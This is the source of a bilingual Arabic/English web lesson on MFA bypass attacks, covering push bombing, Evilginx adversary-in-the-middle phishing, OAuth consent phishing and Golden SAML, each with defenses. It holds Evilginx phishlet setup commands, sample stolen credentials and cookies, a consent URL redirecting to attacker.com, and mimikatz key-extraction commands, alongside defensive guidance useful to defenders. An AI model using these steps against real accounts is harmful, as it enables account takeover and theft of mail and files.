"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="mfa-saml-oauth-attacks">
      <L
        ar={<>
          <Section title="لماذا MFA لا يعني نهاية الهجوم">
            <Analogy>
              تخيل قفلين على باب بيتك: مفتاح ورمز. لو كان أحدهما مكسوراً (mfa fatigue، تطبيق phishing لا يفرّق بين
              الأصلي والمزور)، فالقفل الثاني وحده لا يكفي. MFA يقلل المخاطر بنسبة 99%، لكنه ليس صفراً، والـ 1% المتبقية
              هي ما يستهدفه المهاجمون اليوم.
            </Analogy>
            <p>
              في 2024-2025، أكبر اختراقات الشركات (Uber, MGM, Snowflake) لم تتجاوز كلمات المرور بل MFA. هذا الدرس
              يغطي أربعة محاور: MFA fatigue، Adversary-in-the-Middle مع Evilginx، token theft، Golden SAML.
            </p>
          </Section>

          <Section title="1. MFA Fatigue / Push Bombing">
            <p>
              المهاجم يعرف كلمة المرور. يضغط زر "تسجيل الدخول" 50 مرة. الضحية يتلقى 50 push notification في 10 دقائق
              ويوافق على واحدة فقط ليتوقف الضجيج. هذا ما حدث لـ Uber في سبتمبر 2022.
            </p>
            <Code lang="bash">{`# سيناريو متكرر:
1. credentials من phishing أو credential stuffing
2. تسجيل دخول → MFA push يطلق
3. تكرار كل 30 ثانية لمدة ساعة
4. الضحية يضغط Approve ليصمت الإشعار
5. session token يخرج للمهاجم`}</Code>
            <Card title="الدفاع" color="green">
              <ul>
                <li><strong>Number Matching</strong> (Microsoft, Okta): الضحية يدخل رقم يظهر على شاشة تسجيل الدخول</li>
                <li>تقييد عدد محاولات MFA per hour</li>
                <li>تنبيه على push من IP غير معتاد</li>
                <li>الانتقال إلى FIDO2 / passkeys (لا تسأل المستخدم، توقع شيء فقط)</li>
              </ul>
            </Card>
          </Section>

          <Section title="2. Adversary-in-the-Middle مع Evilginx">
            <Step n={1} title="ما هو AiTM phishing؟">
              ليست صفحة phishing عادية. إنها reverse proxy بين الضحية و Microsoft / Okta الحقيقي. الضحية يدخل
              كلمة المرور، يحل MFA حقيقي، ثم Evilginx يسرق session cookie الناتج.
            </Step>
            <Step n={2} title="آلية العمل">
              <Code lang="text">{`Victim → evilginx.attacker.com → real Microsoft Login
                ↓                         ↓
          credentials caught       MFA challenge passes through
                ↓                         ↓
          MFA code caught          real session cookie returned
                ↓
          attacker uses cookie → fully authenticated session
          (لا يحتاج كلمة المرور أو MFA مرة أخرى)`}</Code>
            </Step>
            <Step n={3} title="إعداد phishlet">
              <Code lang="bash">{`# Evilginx 3.x
evilginx2 -p ./phishlets

[evilginx] config domain login-corp.example
[evilginx] phishlets hostname o365 login-corp.example
[evilginx] phishlets enable o365
[evilginx] lures create o365
[evilginx] lures get-url 0
# https://login-corp.example/auth?lure_id=...`}</Code>
            </Step>
            <Step n={4} title="ما يصل للمهاجم">
              <Terminal lines={[
                { p: "# After victim signs in" },
                { o: "[+] CREDS: john.doe@target.gov / Spring2024!\n[+] COOKIES: ESTSAUTHPERSISTENT=0.AS...\n[+] SESSION saved: john.doe.session.json" },
                { p: "# Replay the cookie in Cookie Editor extension" },
                { o: "[+] Logged in as john.doe@target.gov — no password, no MFA" },
              ]} />
            </Step>
            <Card title="الدفاع" color="green">
              <ul>
                <li><strong>FIDO2 / WebAuthn</strong>: مرتبط بنطاق الـ origin، لا يعمل على evilginx domain</li>
                <li>Conditional Access: device compliance + IP location</li>
                <li>Token Protection (Azure AD): cookie مرتبط بالجهاز</li>
                <li>كشف phishing domains via certificate transparency monitoring (crt.sh على نطاقك المشتق)</li>
              </ul>
            </Card>
          </Section>

          <Section title="3. OAuth Consent Phishing">
            <p>
              لا تطلب كلمة المرور — اطلب من الضحية أن يمنح تطبيقك صلاحيات على حسابه. في Microsoft 365، هذا يفتح
              قراءة البريد، الملفات، والبريد المرسل، حتى بعد تغيير كلمة المرور.
            </p>
            <Code lang="text">{`Phishing email:
"Click to view shared report"
↓
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=<EVIL_APP>
  &response_type=code
  &scope=Mail.Read Files.ReadWrite User.Read offline_access
  &redirect_uri=https://attacker.com/callback

Victim sees: "Cool Reports App wants to access your mailbox"
Victim clicks Accept
→ Attacker gets refresh token good for 90 days`}</Code>
            <Card title="الدفاع" color="green">
              <ul>
                <li>Admin consent للتطبيقات بصلاحيات حساسة</li>
                <li>Block unverified publishers</li>
                <li>راقب OAuth grants — Sentinel rule على Microsoft.Graph events</li>
                <li>Quarterly review لكل enterprise application في tenant</li>
              </ul>
            </Card>
          </Section>

          <Section title="4. Golden SAML">
            <p>
              لو سرقت private key لـ ADFS / Okta signing certificate، تستطيع توقيع SAML response لأي مستخدم،
              بأي صلاحيات، تنتهي عند أي وقت تريد. هذا ما حدث في SolarWinds: ADFS keys سُرقت ثم استخدمت
              لتسجيل دخول إلى cloud apps دون أي تنبيه.
            </p>
            <Code lang="powershell">{`# ADFS service account → token signing key
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # vault::cred /patch
# يستخرج private key من Microsoft.IdentityServer service`}</Code>
            <Card title="الدفاع" color="green">
              <ul>
                <li>HSM للـ ADFS signing keys (لا يمكن استخراجها برمجياً)</li>
                <li>تقصير عمر SAML tokens (15 دقيقة بدلاً من 8 ساعات)</li>
                <li>Conditional Access على cloud apps حتى مع SAML صحيح</li>
                <li>راقب unusual SAML claims (admin role غير معتاد)</li>
              </ul>
            </Card>
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            بناء phishing domains، إرسال email، أو سرقة tokens من نظام لا تملكه = جرائم اتحادية متعددة. كل
            مثال هنا في مختبرك مع authorization مكتوب.
          </Callout>

          <Section title="مصادر">
            <ul>
              <li>Microsoft Security — Threat Intelligence on AiTM</li>
              <li>Mandiant — UNC2452 / Solorigate (Golden SAML)</li>
              <li>Push Security — AiTM toolkit research</li>
              <li>SpecterOps — Token Tactics on Azure</li>
              <li>MITRE ATT&CK — T1556.005 Reverse Proxy MFA Bypass</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="Why MFA isn't the end of the attack">
            <Analogy>
              Two locks on a door: a key and a code. If one is broken (MFA fatigue, a phishing site that proxies the
              real one), the second alone isn't enough. MFA cuts risk by ~99%, but not 100% — and the remaining 1% is
              exactly what attackers target today.
            </Analogy>
            <p>
              In 2024-2025 most major corporate breaches (Uber, MGM, Snowflake) didn't bypass passwords — they
              bypassed MFA. This lesson covers four vectors: MFA fatigue, AiTM with Evilginx, token theft, and Golden
              SAML.
            </p>
          </Section>

          <Section title="1. MFA fatigue / push bombing">
            <p>
              Attacker has the password. They hit "sign in" 50 times. Victim gets 50 push notifications in 10 minutes
              and approves one to make the noise stop. Exactly what happened to Uber in September 2022.
            </p>
            <Code lang="bash">{`# Recurring scenario:
1. Credentials from phishing or credential stuffing
2. Sign-in attempt → MFA push fires
3. Repeat every 30 seconds for an hour
4. Victim taps Approve to silence the notification
5. Session token flows back to the attacker`}</Code>
            <Card title="Defense" color="green">
              <ul>
                <li><strong>Number matching</strong> (Microsoft, Okta): victim types a number from the sign-in screen</li>
                <li>Rate-limit MFA prompts per hour</li>
                <li>Alert on push from unusual IP / geo</li>
                <li>Move to FIDO2 / passkeys (no prompt, just signature)</li>
              </ul>
            </Card>
          </Section>

          <Section title="2. Adversary-in-the-Middle with Evilginx">
            <Step n={1} title="What is AiTM phishing?">
              Not a static phishing page. A reverse proxy between victim and the real Microsoft / Okta. Victim types
              the password, completes real MFA, and Evilginx steals the resulting session cookie.
            </Step>
            <Step n={2} title="Mechanics">
              <Code lang="text">{`Victim → evilginx.attacker.com → real Microsoft Login
                ↓                         ↓
          credentials caught       MFA challenge passes through
                ↓                         ↓
          MFA code caught          real session cookie returned
                ↓
          attacker uses cookie → fully authenticated session
          (no password or MFA needed again)`}</Code>
            </Step>
            <Step n={3} title="Phishlet setup">
              <Code lang="bash">{`# Evilginx 3.x
evilginx2 -p ./phishlets

[evilginx] config domain login-corp.example
[evilginx] phishlets hostname o365 login-corp.example
[evilginx] phishlets enable o365
[evilginx] lures create o365
[evilginx] lures get-url 0
# https://login-corp.example/auth?lure_id=...`}</Code>
            </Step>
            <Step n={4} title="What the attacker receives">
              <Terminal lines={[
                { p: "# After victim signs in" },
                { o: "[+] CREDS: john.doe@target.gov / Spring2024!\n[+] COOKIES: ESTSAUTHPERSISTENT=0.AS...\n[+] SESSION saved: john.doe.session.json" },
                { p: "# Replay the cookie via Cookie Editor extension" },
                { o: "[+] Logged in as john.doe@target.gov — no password, no MFA" },
              ]} />
            </Step>
            <Card title="Defense" color="green">
              <ul>
                <li><strong>FIDO2 / WebAuthn</strong>: bound to the origin, won't authenticate on the evilginx domain</li>
                <li>Conditional Access: device compliance + IP/location signals</li>
                <li>Token Protection (Azure AD): cookies tied to the device</li>
                <li>Detect phishing domains via certificate transparency monitoring (crt.sh on look-alikes)</li>
              </ul>
            </Card>
          </Section>

          <Section title="3. OAuth consent phishing">
            <p>
              Don't ask for the password — ask the victim to grant your app permissions on their account. In Microsoft
              365 that opens mail read, file read/write, and sent items access — surviving even password rotation.
            </p>
            <Code lang="text">{`Phishing email:
"Click to view shared report"
↓
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=<EVIL_APP>
  &response_type=code
  &scope=Mail.Read Files.ReadWrite User.Read offline_access
  &redirect_uri=https://attacker.com/callback

Victim sees: "Cool Reports App wants to access your mailbox"
Victim clicks Accept
→ Attacker gets refresh token good for 90 days`}</Code>
            <Card title="Defense" color="green">
              <ul>
                <li>Admin consent required for high-permission apps</li>
                <li>Block unverified publishers</li>
                <li>Watch OAuth grants — Sentinel rule on Microsoft.Graph events</li>
                <li>Quarterly review of every enterprise application in the tenant</li>
              </ul>
            </Card>
          </Section>

          <Section title="4. Golden SAML">
            <p>
              Steal an ADFS / Okta signing certificate's private key and you can sign a SAML response for any user,
              with any roles, valid for any duration. This is what happened in SolarWinds: stolen ADFS keys were
              used to sign into cloud apps with no alert.
            </p>
            <Code lang="powershell">{`# ADFS service account → token signing key
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # vault::cred /patch
# Extracts the private key from the Microsoft.IdentityServer service`}</Code>
            <Card title="Defense" color="green">
              <ul>
                <li>HSM for ADFS signing keys (not extractable in software)</li>
                <li>Shorten SAML token lifetime (15 minutes vs 8 hours)</li>
                <li>Conditional Access on cloud apps even with valid SAML</li>
                <li>Watch unusual SAML claims (unexpected admin role)</li>
              </ul>
            </Card>
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            Standing up phishing domains, sending emails, or stealing tokens from systems you don't own = multiple
            federal crimes. Every example here belongs in your lab with written authorization.
          </Callout>

          <Section title="References">
            <ul>
              <li>Microsoft Security — Threat Intelligence on AiTM</li>
              <li>Mandiant — UNC2452 / Solorigate (Golden SAML)</li>
              <li>Push Security — AiTM toolkit research</li>
              <li>SpecterOps — Token Tactics on Azure</li>
              <li>MITRE ATT&CK — T1556.005 Reverse Proxy MFA Bypass</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
